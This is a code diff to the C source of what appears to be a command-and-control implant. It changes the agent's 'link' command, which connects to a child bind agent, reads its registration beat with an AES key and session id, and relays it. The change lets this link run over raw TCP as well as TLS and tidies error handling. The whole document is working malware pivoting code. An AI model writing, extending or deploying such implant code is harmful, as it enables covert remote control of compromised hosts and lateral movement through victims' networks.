@@ -954,24 +954,31 @@ static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
         return NAX_STATUS_ERR;
     }
 
+    /* wire: [link_type(1)][use_tls(1)][port(2LE)][ip_len(4LE)][ip_bytes] */
+    if (t->args_len < 9) {
+        const char *msg = "link: args too short";
+        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
+        return NAX_STATUS_ERR;
+    }
     uint8_t  link_type = t->args[0];
     if (link_type != 2) {
         const char *msg = "link: only tcp-bind (type=2) supported";
         *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
         return NAX_STATUS_ERR;
     }
-    uint16_t port   = (uint16_t)t->args[1] | ((uint16_t)t->args[2] << 8);
-    uint32_t ip_len = (uint32_t)t->args[3]       |
-                      (uint32_t)t->args[4] << 8   |
-                      (uint32_t)t->args[5] << 16  |
-                      (uint32_t)t->args[6] << 24;
-    if (t->args_len < 7 + ip_len || ip_len == 0 || ip_len > 255) {
+    uint8_t  use_tls = t->args[1];
+    uint16_t port    = (uint16_t)t->args[2] | ((uint16_t)t->args[3] << 8);
+    uint32_t ip_len  = (uint32_t)t->args[4]       |
+                       (uint32_t)t->args[5] << 8   |
+                       (uint32_t)t->args[6] << 16  |
+                       (uint32_t)t->args[7] << 24;
+    if (t->args_len < 8 + ip_len || ip_len == 0 || ip_len > 255) {
         const char *msg = "link: bad ip_len";
         *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
         return NAX_STATUS_ERR;
     }
     char ip[256];
-    memcpy(ip, t->args + 7, ip_len);
+    memcpy(ip, t->args + 8, ip_len);
     ip[ip_len] = '\0';
 
     /* Connect to child bind agent */
@@ -998,24 +1005,33 @@ static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
     }
     freeaddrinfo(res);
 
-    /* TLS handshake with child bind agent */
-    SSL *child_ssl = link_tls_connect(csock);
-    if (!child_ssl) {
-        close(csock);
-        const char *msg = "link: TLS handshake with child failed";
-        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
-        return NAX_STATUS_ERR;
-    }
-
-    /* Read the child's REGISTER beat (length-prefixed, over TLS) */
+    SSL     *child_ssl = NULL;
     uint8_t  *beat     = NULL;
     uint32_t  beat_len = 0;
-    if (link_tls_lp_recv(child_ssl, &beat, &beat_len) < 0 || beat_len < 20) {
-        SSL_free(child_ssl);
-        close(csock);
-        const char *msg = "link: failed to read child beat";
-        *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
-        return NAX_STATUS_ERR;
+
+    if (use_tls) {
+        child_ssl = link_tls_connect(csock);
+        if (!child_ssl) {
+            close(csock);
+            const char *msg = "link: TLS handshake with child failed";
+            *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
+            return NAX_STATUS_ERR;
+        }
+        if (link_tls_lp_recv(child_ssl, &beat, &beat_len) < 0 || beat_len < 20) {
+            SSL_free(child_ssl);
+            close(csock);
+            const char *msg = "link: failed to read child beat (tls)";
+            *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
+            return NAX_STATUS_ERR;
+        }
+    } else {
+
+        if (cmd_link_lp_recv(csock, &beat, &beat_len) < 0 || beat_len < 20) {
+            close(csock);
+            const char *msg = "link: failed to read child beat (raw)";
+            *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
+            return NAX_STATUS_ERR;
+        }
     }
 
     /* Child beat layout (v2): [wm(4)][aes_key(16)][sessionId(16)][encrypted_register]
@@ -1024,7 +1040,9 @@ static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
      * InternalHandler uses aes_key to correctly register the child
      * regardless of which transport the parent uses. */
     if (beat_len < 36) { /* wm(4) + key(16) + sid(16) minimum */
-        free(beat); SSL_shutdown(child_ssl); SSL_free(child_ssl); close(csock);
+        free(beat);
+        if (child_ssl) { SSL_shutdown(child_ssl); SSL_free(child_ssl); }
+        close(csock);
         const char *msg = "link: child beat too short";
         *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
         return NAX_STATUS_ERR;
@@ -1037,7 +1055,9 @@ static uint8_t cmd_link(NaxAgent *a, NaxTask *t,
     uint32_t result_len = 1 + beat_len; /* 1 for link_type, rest is full beat */
     uint8_t *result = malloc(result_len);
     if (!result) {
-        free(beat); close(csock);
+        free(beat);
+        if (child_ssl) { SSL_shutdown(child_ssl); SSL_free(child_ssl); }
+        close(csock);
         const char *msg = "link: out of memory";
         *out = (uint8_t *)strdup(msg); *out_len = strlen(msg);
         return NAX_STATUS_ERR;
